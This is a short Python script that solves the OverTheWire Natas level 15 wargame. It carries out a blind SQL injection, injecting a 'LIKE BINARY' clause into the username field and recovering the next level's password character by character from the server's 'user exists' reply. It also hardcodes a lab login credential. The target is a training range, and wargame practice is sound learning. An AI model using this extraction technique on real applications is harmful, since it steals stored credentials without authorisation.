url = "https://www.lsy.pl"

import requests
from requests.auth import HTTPBasicAuth

ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
digits = '0123456789'

signs = ascii_letters+digits

s = requests.Session()
username = 'natas16'
password = ""

query = 'natas16" AND password LIKE BINARY "{}%'
s.auth = HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

for _ in range(32):
    for x in signs:
        response = s.post(url="http://natas15.natas.labs.overthewire.org", params={"username":query.format(password+x)})
        if "This user exists" in response.text:
            password = password+x
        print(password)






